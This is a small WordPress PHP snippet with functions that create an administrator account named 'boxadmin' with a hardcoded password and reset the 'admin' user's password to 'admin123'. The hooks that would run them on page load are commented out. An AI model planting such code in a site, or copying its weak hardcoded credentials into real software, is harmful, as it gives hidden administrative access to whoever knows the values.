<?php
function box_insert_admin(){

    $args = array(
        'user_email' => 'admin@gmail.com',   
        'first_name' => 'First',  
        'last_name'  => 'Last ',  
        'role'       => 'administrator',
        'user_login' => 'boxadmin',
	    'user_pass'  => "boxadmin@"
    );  
    $user_id = wp_insert_user($args);
    if ( ! is_wp_error( $user_id ) ) {
        echo "User created : ". $user_id;
  
    } else {
        echo '<pre>';
        var_dump($user_id);

    }
}
function box_auto_run(){
    



    
}
function box_update_password(){
    $user = get_user_by('login','admin');

    $user_data = wp_update_user( array( 'ID' => $user->ID, 'user_pass' => 'admin123' ) );
     // die('this is footer');
}
// add_action('wp_footer','box_update_password');
 // add_action('init','box_auto_run');
 // add_action('init','box_update_password');


